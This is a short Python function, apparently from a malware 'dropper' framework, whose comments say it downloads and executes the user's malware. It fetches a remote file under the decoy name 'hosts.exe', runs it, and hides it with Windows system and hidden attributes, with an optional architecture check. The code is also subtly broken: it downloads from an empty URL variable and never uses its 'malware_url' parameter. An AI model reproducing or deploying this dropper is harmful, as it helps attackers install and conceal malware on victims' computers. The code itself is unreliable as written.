#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This script aims to download and execute your malware (¯\_(ツ)_/¯)
#Start

def fire_things_up(malware_url,arch="No"):
    import urllib,platform,os,sys
    url   = ""
    #check architecture
    if arch != "No":
        if platform.architecture()[0][:2] == arch:
            x = urllib.request.urlretrieve(url,"hosts.exe")
            xx = os.popen("hosts.exe")
            xxx = os.popen("attrib +s +h hosts.exe")
            sys.exit(0)
    else:
        x = urllib.request.urlretrieve(url,"hosts.exe")
        xx = os.popen("hosts.exe")
        xxx = os.popen("attrib +s +h hosts.exe") #hiding the file
